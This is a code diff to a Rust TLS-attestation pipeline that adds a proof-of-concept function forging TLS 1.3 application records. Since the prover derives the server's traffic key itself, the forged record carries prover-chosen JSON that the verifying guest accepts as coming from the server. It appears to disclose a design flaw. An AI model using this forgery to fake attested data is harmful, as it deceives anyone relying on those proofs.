@@ -64,7 +64,7 @@ pub fn parse_records(bytes: &[u8]) -> anyhow::Result<Vec<RawRecord>> {
 // ---------------------------------------------------------------------------
 
 /// HKDF-Expand-Label as defined in RFC 8446.
-fn hkdf_expand_label(prk: &[u8], label: &str, context: &[u8], len: usize) -> Vec<u8> {
+pub(crate) fn hkdf_expand_label(prk: &[u8], label: &str, context: &[u8], len: usize) -> Vec<u8> {
     // HkdfLabel = length(2) || "tls13 " || label || context
     let full_label = format!("tls13 {label}");
     let mut info = Vec::new();
@@ -81,7 +81,7 @@ fn hkdf_expand_label(prk: &[u8], label: &str, context: &[u8], len: usize) -> Vec
 }
 
 /// Derive AES-128-GCM key (16 bytes) and IV (12 bytes) from a traffic secret.
-fn derive_key_iv(traffic_secret: &[u8]) -> ([u8; 16], [u8; 12]) {
+pub(crate) fn derive_key_iv(traffic_secret: &[u8]) -> ([u8; 16], [u8; 12]) {
     let key_bytes = hkdf_expand_label(traffic_secret, "key", &[], 16);
     let iv_bytes = hkdf_expand_label(traffic_secret, "iv", &[], 12);
 
@@ -94,7 +94,7 @@ fn derive_key_iv(traffic_secret: &[u8]) -> ([u8; 16], [u8; 12]) {
 
 /// XOR the per-record nonce: RFC 8446 §5.3 — XOR `iv` with the 64-bit
 /// big-endian sequence number placed in the rightmost 8 bytes.
-fn per_record_nonce(iv: &[u8; 12], seq: u64) -> [u8; 12] {
+pub(crate) fn per_record_nonce(iv: &[u8; 12], seq: u64) -> [u8; 12] {
     let mut nonce = *iv;
     let seq_bytes = seq.to_be_bytes();
     for (i, b) in seq_bytes.iter().enumerate() {
@@ -370,4 +370,107 @@ fn record_bytes(r: &RawRecord) -> Vec<u8> {
     out.extend_from_slice(&(r.payload.len() as u16).to_be_bytes());
     out.extend_from_slice(&r.payload);
     out
+}
+
+// ---------------------------------------------------------------------------
+// PoC: server-side record forgery
+// ---------------------------------------------------------------------------
+//
+// `forge_app_record` produces a TLS 1.3 `ApplicationData` record that is
+// *bit-for-bit indistinguishable* from one the real server would have sent.
+// The guest decrypts it successfully, parses the inner HTTP body, and
+// commits whatever JSON the prover chose.
+//
+// The forgery is possible because the inputs needed to mint such a record
+// — the AEAD key and IV — are deterministic functions of
+// `server_application_traffic_secret_0`, and that secret is derived by both
+// endpoints from the *handshake* alone (RFC 8446 §7.1):
+//
+//     [sender]_application_traffic_secret_0 = HKDF-Expand-Label(
+//         Master-Secret, "[sender] ap traffic", transcript_hash, 32)
+//
+// The client (= the prover, in this pipeline) computes `Master-Secret` from
+// `ECDHE_shared = X25519(client_priv, server_pub)` — i.e. from material it
+// already holds. So it derives the *server's* application write key on its
+// own, with no further server interaction, and can encrypt under it.
+//
+// `decrypt_in_place_detached` inside the guest is a symmetric operation: it
+// accepts any ciphertext that authenticates under the derived key, with no
+// notion of "who wrote it". There is nothing the guest can check on the
+// record itself that would distinguish prover-originated from
+// server-originated bytes.
+
+/// Build a TLS 1.3 `ApplicationData` record encrypting `inner_plaintext`
+/// under the AES-128-GCM key derived from `traffic_secret` at sequence
+/// number `seq`. Inner content type is hard-coded to `23` (ApplicationData)
+/// so the guest's HTTP parser is fed the bytes (records with inner_ct != 23
+/// — handshake / alert — are filtered out by `program/src/main.rs`).
+///
+/// The output is the full 5-byte-header + ciphertext + GCM tag wire bytes,
+/// ready to drop into `TlsWitness::encrypted_app_records`.
+///
+/// Wire format reference: RFC 8446 §5.2 (`TLSCiphertext`) and §5.3
+/// (per-record nonce construction).
+pub(crate) fn forge_app_record(
+    traffic_secret: &[u8],
+    seq: u64,
+    inner_plaintext: &[u8],
+) -> anyhow::Result<Vec<u8>> {
+    // ── Step 1. Derive the AEAD key/IV exactly like the guest will. ───────
+    // `derive_key_iv` runs HKDF-Expand-Label with labels "key"/"iv"
+    // (RFC 8446 §7.3) over the traffic secret. The guest performs the
+    // identical derivation on `server_app_secret` and therefore arrives at
+    // the same 16-byte key and 12-byte IV.
+    let (key, iv) = derive_key_iv(traffic_secret);
+
+    // ── Step 2. Build the TLSInnerPlaintext (RFC 8446 §5.2). ──────────────
+    // Layout:    content || ContentType || zeros(padding)
+    // We omit padding (it is permitted but optional). The trailing byte is
+    // the *real* content type that the receiver will see after stripping
+    // off the outer ApplicationData wrapper. 23 = ApplicationData, so the
+    // guest's `if inner_ct == 23 { plaintext.extend_from_slice(&buf) }`
+    // branch fires and the HTTP body we wrote here lands in `plaintext`.
+    let mut buf = inner_plaintext.to_vec();
+    buf.push(23);
+
+    // ── Step 3. Build the outer TLSCiphertext header (RFC 8446 §5.2). ─────
+    // Layout:    opaque_type=23 || legacy_record_version=0x0303
+    //         || length = len(encrypted_record)  (= TLSInnerPlaintext + 16-byte GCM tag)
+    //
+    // The header is also the AAD passed to AES-GCM — both the encrypter
+    // (us) and the decrypter (the guest) must construct it identically or
+    // authentication fails.
+    let payload_len = buf.len() + 16; // ciphertext + GCM tag
+    anyhow::ensure!(payload_len <= u16::MAX as usize, "TLS record too large");
+
+    let mut header = [0u8; 5];
+    header[0] = 23; // TLSCiphertext.opaque_type = ApplicationData
+    header[1..3].copy_from_slice(&0x0303u16.to_be_bytes()); // legacy_record_version
+    header[3..5].copy_from_slice(&(payload_len as u16).to_be_bytes());
+
+    // ── Step 4. Per-record nonce (RFC 8446 §5.3). ─────────────────────────
+    // nonce = iv XOR (zero-padded big-endian seq number in the low 8 bytes).
+    // The guest uses the same construction (`xor_nonce` in program/src/main.rs).
+    // Sequence number 0 means "first application record of the session" —
+    // we control the witness and put exactly one record in it, so seq=0
+    // is what the guest expects when it iterates with `.enumerate()`.
+    let nonce = per_record_nonce(&iv, seq);
+
+    // ── Step 5. AEAD seal (RFC 8446 §5.2 + §5.3). ─────────────────────────
+    // Standard AES-128-GCM: AAD = the 5-byte record header, plaintext = the
+    // TLSInnerPlaintext we just built, output = ciphertext + 16-byte tag.
+    let cipher = Aes128Gcm::new((&key).into());
+    let tag = cipher
+        .encrypt_in_place_detached(&Nonce::from(nonce), &header, &mut buf)
+        .map_err(|_| anyhow::anyhow!("AES-GCM encryption failed"))?;
+
+    // ── Step 6. Concatenate the wire record. ──────────────────────────────
+    // Final layout: header(5) || ciphertext || tag(16).
+    // This is byte-identical to what rustls (or any compliant TLS 1.3
+    // stack) would emit on the server side for the same plaintext.
+    let mut out = Vec::with_capacity(5 + payload_len);
+    out.extend_from_slice(&header);
+    out.extend_from_slice(&buf);
+    out.extend_from_slice(&tag);
+    Ok(out)
 }
